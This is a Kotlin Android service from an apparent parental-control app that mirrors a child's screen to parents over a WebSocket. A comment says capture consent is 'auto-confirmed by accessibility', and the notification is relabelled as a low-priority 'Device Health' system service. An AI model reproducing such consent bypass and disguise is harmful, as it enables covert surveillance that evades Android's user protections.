package com.familyguard.child.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import androidx.core.content.IntentCompat
import com.familyguard.child.R
import com.familyguard.child.data.Store
import com.familyguard.child.util.AgeRelease

class MirrorService : Service() {

    private var handlerThread: HandlerThread? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        ServiceCompat.startForeground(
            this, 2,
            // Fresh-session design: ye service sirf tab zinda hai jab projection
            // chal rahi hai (mirror_stop par release+stop hota hai).
            buildNotif("Screen sharing active"),
            ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
        )
        if (AgeRelease.shouldRelease(this)) {
            stopSelf()
            return START_NOT_STICKY
        }
        if (!MirrorManager.hasProjection) {
            val data = intent?.let { IntentCompat.getParcelableExtra(it, "data", Intent::class.java) }
            if (data == null) {
                stopSelf()
                return START_NOT_STICKY
            }
            val code = intent.getIntExtra("resultCode", android.app.Activity.RESULT_CANCELED)
            val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val projection = runCatching { mgr.getMediaProjection(code, data) }.getOrNull()
            if (projection == null) {
                stopSelf()
                return START_NOT_STICKY
            }
            setupCapture(projection)
        }
        return START_NOT_STICKY
    }

    private fun setupCapture(projection: MediaProjection) {
        runCatching {
            val metrics = resources.displayMetrics
            val maxSide = maxOf(metrics.widthPixels, metrics.heightPixels)
            val scale = if (maxSide > 720) 720f / maxSide else 1f
            val w = (metrics.widthPixels * scale).toInt().coerceAtLeast(1)
            val h = (metrics.heightPixels * scale).toInt().coerceAtLeast(1)
            // maxImages=4: Android 14/15 par 2-buffer ImageReader kabhi-kabhi
            // stall ho jata tha (consumer ek frame slow hua to producer block,
            // frames aana band — "cast icon on par screen nahi aayi").
            val reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 4)
            val thread = HandlerThread("fg_mirror").apply { start() }
            handlerThread = thread
            val handler = Handler(thread.looper)
            val vd = projection.createVirtualDisplay(
                "fg_mirror", w, h, metrics.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader.surface, null, handler
            )
            reader.setOnImageAvailableListener({ r ->
                r.acquireLatestImage()?.let { MirrorManager.onImage(it) }
            }, handler)
            projection.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    Store.pendingMirrorFps = -1
                    notifyStreaming(false)
                    MirrorManager.release()
                    stopSelf()
                }
            }, handler)
            MirrorManager.markActive(projection, reader, w, h, metrics.densityDpi, vd, handler)
            // WS drop / session dead hone par MirrorManager khud release kare to
            // service bhi stop ho — notification + FGS baki na rahe.
            MirrorManager.onSessionDead = { runCatching { stopSelf() } }
            // Projection MIL GAYI — in-flight consent state clear karo, warna
            // smart suppression galat dikh rahi hogi (mirror off→on turant).
            Store.projectionRequestedAt = 0L
            // If the parent pressed "Start mirroring" while permission was missing
            // (e.g. right after reboot), resume streaming automatically now that
            // consent has been granted (auto-confirmed by accessibility).
            if (Store.pendingMirrorFps > 0) {
                MirrorManager.startStreaming(Store.pendingMirrorFps, Store.pendingMirrorQuality)
                Store.pendingMirrorFps = -1
                notifyStreaming(true)
            }
        }.onFailure {
            stopSelf()
        }
    }

    override fun onDestroy() {
        MirrorManager.onSessionDead = null
        MirrorManager.release()
        handlerThread?.quitSafely()
        handlerThread = null
        super.onDestroy()
    }

    /** Report the real streaming state to the parents over WS (best effort). */
    private fun notifyStreaming(streaming: Boolean) {
        runCatching {
            val m = com.google.gson.JsonObject()
            m.addProperty("type", "mirror_state")
            m.addProperty("streaming", streaming)
            WsChild.send(m.toString())
        }
    }

    private fun buildNotif(title: String): Notification {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        nm.deleteNotificationChannel("fg_service")
        nm.createNotificationChannel(NotificationChannel("dh_service", "Device Health", NotificationManager.IMPORTANCE_MIN))
        return NotificationCompat.Builder(this, "dh_service")
            .setSmallIcon(R.drawable.ic_app)
            .setContentTitle(title)
            .setContentText("System service running")
            .setOngoing(true)
            .build()
    }
}
